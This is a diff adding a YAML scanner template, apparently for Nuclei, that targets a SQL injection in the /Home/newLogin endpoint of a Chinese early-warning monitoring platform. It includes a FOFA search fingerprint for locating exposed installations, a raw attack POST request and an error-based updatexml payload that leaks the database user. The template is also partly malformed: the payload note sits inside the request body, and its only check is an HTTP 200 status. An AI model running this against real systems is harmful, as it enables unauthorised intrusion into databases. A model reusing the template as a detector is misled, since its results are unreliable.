@@ -1,0 +1,45 @@
+id: poc-ip5n55178opbdxo5
+info:
+  name: 预警监控平台newLogin存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ip5n55178opbdxo5'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ip5n55178opbdxo5
+    fofa: '"myCss/phone.css"'
+http:
+- raw:
+  - 'POST /Home/newLogin HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 185
+
+
+    data=LvF7NkZZRJyO1zXJAT%2FuxSNQv5lgcWR%2FdKqlDuMbMthvwjJDYfUu362DBQWRHe9fhDt7duyHf92vjlfaqtG%2BZWctT5AFerKuEebb1Twup7KlMsbLm3CSLEBWw1AQd6cmls3Ei4ASjehn46vAlq7nvwnmfzZ9D1AlXWCmQsgjxlw%3D
+
+
+    测试Payload：'' and updatexml(1, concat(''~'', user()), null)--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
